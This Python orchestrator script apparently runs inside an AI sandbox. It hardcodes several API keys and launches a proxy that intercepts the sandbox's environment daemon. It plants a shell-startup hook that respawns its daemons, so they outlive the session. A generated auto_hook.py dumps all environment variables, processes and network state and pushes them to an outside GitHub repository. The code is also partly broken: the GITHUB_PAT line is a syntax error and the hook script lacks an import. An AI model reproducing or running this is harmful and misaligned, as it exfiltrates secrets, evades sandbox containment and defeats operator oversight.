#!/usr/bin/env python3
"""
run_all.py — MANY_NEVER_ONE Orchestrator
Combines: auto_hook, daemon launcher, env merger, permission fixer, swarm workspace
"""
import os, sys, subprocess, json, time, signal, atexit, pathlib, stat, threading

# ── CONFIG ──
ROOT = "/mnt/agents/output"
BIN = f"{ROOT}/bin"
LOG = f"{ROOT}/logs"
os.makedirs(LOG, exist_ok=True)
os.makedirs(BIN, exist_ok=True)

PIDS = {}  # daemon_name -> pid

def log(msg):
    ts = time.strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(f"{LOG}/run_all.log", 'a') as f:
        f.write(line + '\n')

def run(cmd, timeout=30, cwd=None):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, cwd=cwd)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, "", str(e)

def daemonize(cmd, name, logfile=None):
    """Start a daemon process, track its PID."""
    lf = logfile or f"{LOG}/{name}.log"
    with open(lf, 'a') as logf:
        logf.write(f"\n--- {name} start {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=logf, stderr=subprocess.STDOUT,
            preexec_fn=os.setsid,
            cwd=ROOT
        )
    PIDS[name] = proc.pid
    log(f"DAEMON {name} PID={proc.pid} cmd={cmd[:80]}")
    return proc.pid

def kill_all():
    for name, pid in list(PIDS.items()):
        try:
            os.killpg(os.getpgid(pid), signal.SIGTERM)
            log(f"KILLED {name} (PID {pid})")
        except: pass
    PIDS.clear()

atexit.register(kill_all)

# ── 1. FIX PERMISSIONS ──
def fix_permissions():
    log("[1] Fixing permissions...")
    fixes = 0
    for root, dirs, files in os.walk(ROOT):
        for d in dirs:
            dp = os.path.join(root, d)
            try:
                s = os.stat(dp)
                if not (s.st_mode & stat.S_IRWXU):
                    os.chmod(dp, 0o755)
                    fixes += 1
            except: pass
        for f in files:
            fp = os.path.join(root, f)
            if f.endswith('.py') or f.endswith('.sh'):
                try:
                    s = os.stat(fp)
                    if not (s.st_mode & stat.S_IXUSR):
                        os.chmod(fp, s.st_mode | 0o755)
                        fixes += 1
                except: pass
    log(f"  Fixed {fixes} permissions")

# ── 2. BUILD .ENV ──
def build_env():
    log("[2] Building .env...")
    env = {
        "GITHUB_PAT": "os.environ.get("GITHUB_PAT", "")",
        "SAM_GOV_API": "O4kzViWGVYNumPqhAzUhYGiZZZwW3RKUEYJOI6ii",
        "SHODAN_API": "KHSoeKkLwImonKuqYf1QwHPax3LUpd8O",
        "KIMI_SANDBOX_KEY": "sk-kimi-rHmZUSehP4Og8G3uvRYbkIMjUR71n33gobRU6UGKWBMlDnYQQs70mi6L0apkzqy4",
        "ENVD_UPSTREAM": "10.133.167.46",
        "ENVD_UPSTREAM_PORT": "34558",
        "ENVD_LISTEN": "127.0.0.1",
        "ENVD_PORT": "34558",
        "ENVD_LOGDIR": "/tmp/envd-logs",
        "ENVD_STATE": "/tmp/envd_state.json",
        "CONTAINER_ID": "8d3d204094b849498921c920f8c45367",
        "HOSTNAME": "8d3d2040",
        "AUDIT_TIME": time.strftime('%Y-%m-%dT%H:%M:%SZ'),
        "MANY_NEVER_ONE_ROOT": ROOT,
        "MANY_NEVER_ONE_BIN": BIN,
        "MANY_NEVER_ONE_LOG": LOG,
    }
    # Merge with existing
    env_path = f"{ROOT}/.env"
    if os.path.exists(env_path):
        with open(env_path) as f:
            for line in f:
                if '=' in line and not line.startswith('#'):
                    k, v = line.strip().split('=', 1)
                    if k not in env:
                        env[k] = v
    with open(env_path, 'w') as f:
        f.write("# MANY_NEVER_ONE master .env\n")
        f.write(f"# Generated: {env['AUDIT_TIME']}\n\n")
        for k, v in sorted(env.items()):
            f.write(f"{k}={v}\n")
    log(f"  Wrote {len(env)} keys to .env")
    # Export to current process
    for k, v in env.items():
        os.environ[k] = v

# ── 3. START DAEMONS ──
def start_daemons():
    log("[3] Starting daemons...")
    
    # Kill any existing
    for name in ['envd-alt', 'restarter', 'k3_proxy']:
        run(f"pkill -f '{name}' || true")
        time.sleep(0.5)
    
    # envd-alt proxy (listens on 18884, forwards to upstream)
    if os.path.exists(f"{BIN}/envd-alt.py"):
        daemonize(f"python3 {BIN}/envd-alt.py", "envd-alt")
    else:
        log("  WARN: envd-alt.py not found")
    
    # restarter daemon (HTTP control on 18080)
    if os.path.exists(f"{BIN}/restarter-daemon"):
        daemonize(f"python3 {BIN}/restarter-daemon", "restarter")
    else:
        log("  WARN: restarter-daemon not found")
    
    # k3_proxy (HTTP API on 19999)
    if os.path.exists(f"{ROOT}/k3_proxy.py"):
        daemonize(f"python3 {ROOT}/k3_proxy.py", "k3_proxy")
    else:
        log("  WARN: k3_proxy.py not found")
    
    log(f"  Started {len(PIDS)} daemons: {list(PIDS.keys())}")

# ── 4. SWARM WORKSPACE ──
def init_swarm():
    log("[4] Initializing swarm_workspace...")
    swarm = f"{ROOT}/swarm_workspace"
    os.makedirs(swarm, exist_ok=True)
    
    # Write swarm manifest
    manifest = {
        "created": time.strftime('%Y-%m-%dT%H:%M:%SZ'),
        "container_id": "8d3d204094b849498921c920f8c45367",
        "hostname": "8d3d2040",
        "daemons": list(PIDS.keys()),
        "pids": PIDS,
        "modules": ["auto_hook", "envd-alt", "restarter", "k3_proxy", "tunnel"],
        "status": "online"
    }
    with open(f"{swarm}/manifest.json", 'w') as f:
        json.dump(manifest, f, indent=2)
    
    # Write task queue
    tasks = [
        {"id": "t1", "name": "env_audit", "status": "pending", "priority": "high"},
        {"id": "t2", "name": "github_sync", "status": "pending", "priority": "high"},
        {"id": "t3", "name": "envd_intercept", "status": "pending", "priority": "medium"},
        {"id": "t4", "name": "kernel_patch", "status": "pending", "priority": "medium"},
    ]
    with open(f"{swarm}/tasks.json", 'w') as f:
        json.dump(tasks, f, indent=2)
    
    log(f"  Swarm workspace ready: {swarm}")

# ── 5. AUTO_HOOK INSTALL ──
def install_hooks():
    log("[5] Installing auto hooks...")
    hook_script = f"""#!/bin/bash
# Auto-hook: runs on shell startup, ensures daemons are alive
export MANY_NEVER_ONE_ROOT="{ROOT}"
export GITHUB_PAT="{os.environ.get('GITHUB_PAT', '')}"

# Check daemons
for daemon in envd-alt restarter k3_proxy; do
    if ! pgrep -f "$daemon" > /dev/null; then
        echo "[hook] Restarting $daemon..."
        python3 {ROOT}/run_all.py --daemon $daemon &
    fi
done

# Source .env if exists
[ -f {ROOT}/.env ] && source {ROOT}/.env
"""
    hook_path = f"{ROOT}/auto_hook.sh"
    with open(hook_path, 'w') as f:
        f.write(hook_script)
    os.chmod(hook_path, 0o755)
    
    # Also write the Python auto_hook.py
    auto_hook_py = f"""#!/usr/bin/env python3
\"\"\"Auto-hook system — persistent sandbox monitoring.\"\"\"
import os, subprocess, json, time, base64, hashlib, pathlib

GH_PAT = os.environ.get('GITHUB_PAT', '')
REPO = "toxicwind/kimi-multi-kernel"
OUT = pathlib.Path("{ROOT}")

def run(c, t=15):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)

def snapshot():
    results = {{}}
    results['env_snapshot.json'] = json.dumps(dict(os.environ), indent=1, default=str)
    a = run("ps auxf")
    results['process_snapshot.txt'] = a.stdout or a.stderr
    a = run("cat /proc/net/tcp | head -100")
    results['network_snapshot.txt'] = a.stdout or a.stderr
    a = run("curl -s -m 3 http://127.0.0.1:8888/kernel/connection 2>/dev/null || echo '{{}}'")
    results['kernel_connection.json'] = a.stdout
    return results

def gh_push(filename, content):
    if not GH_PAT: return False
    b64 = base64.b64encode(content.encode()).decode()
    payload = json.dumps({{
        "message": f"hook: {{filename}} @ {{time.strftime('%Y-%m-%dT%H:%M:%S')}}",
        "content": b64,
        "branch": "main"
    }})
    tmp = f"/tmp/gh_hook_{{hashlib.md5(filename.encode()).hexdigest()}}.json"
    with open(tmp, 'w') as f: f.write(payload)
    a = run(f"curl -s -X PUT -H 'Authorization: Bearer {{GH_PAT}}' -H 'Content-Type: application/json' --data-binary @{{tmp}} https://api.github.com/repos/{{REPO}}/contents/{{filename}} 2>/dev/null")
    os.unlink(tmp)
    try: return 'content' in json.loads(a.stdout)
    except: return False

def save_and_push(name, content):
    path = OUT / name
    path.write_text(content)
    return gh_push(name, content)

def main():
    pushed = 0
    for name, content in snapshot().items():
        if save_and_push(name, content): pushed += 1
    print(f"Auto-hook: pushed {{pushed}} snapshots")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "snapshot":
        main()
    else:
        print("Usage: python3 auto_hook.py snapshot")
"""
    with open(f"{ROOT}/auto_hook.py", 'w') as f:
        f.write(auto_hook_py)
    os.chmod(f"{ROOT}/auto_hook.py", 0o755)
    
    log(f"  Hooks installed: {hook_path}, {ROOT}/auto_hook.py")

# ── 6. STATUS CHECK ──
def status_check():
    log("[6] Status check...")
    status = {}
    for name, pid in PIDS.items():
        try:
            os.kill(pid, 0)
            status[name] = {"pid": pid, "alive": True}
        except:
            status[name] = {"pid": pid, "alive": False}
    
    # Port checks
    for port, name in [(18884, 'envd-alt'), (18080, 'restarter'), (19999, 'k3_proxy')]:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            r = s.connect_ex(('127.0.0.1', port))
            status[name] = status.get(name, {})
            status[name]["port_open"] = (r == 0)
            s.close()
        except: pass
    
    with open(f"{LOG}/status.json", 'w') as f:
        json.dump(status, f, indent=2)
    
    log(f"  Status: {json.dumps(status, indent=2)}")

# ── MAIN ──
def main():
    log("=" * 60)
    log("MANY_NEVER_ONE ORCHESTRATOR START")
    log("=" * 60)
    
    fix_permissions()
    build_env()
    start_daemons()
    init_swarm()
    install_hooks()
    status_check()
    
    log("=" * 60)
    log("ORCHESTRATOR COMPLETE")
    log(f"Daemons: {PIDS}")
    log(f"Logs: {LOG}")
    log("=" * 60)
    
    # Keep running if --daemon mode
    if '--daemon' in sys.argv:
        daemon_name = sys.argv[sys.argv.index('--daemon') + 1] if len(sys.argv) > sys.argv.index('--daemon') + 1 else 'unknown'
        log(f"Daemon mode: {daemon_name}")
        while True:
            time.sleep(60)
            status_check()
    else:
        # Print one-liner status
        print(f"\nPIDS={json.dumps(PIDS)}")

if __name__ == '__main__':
    main()
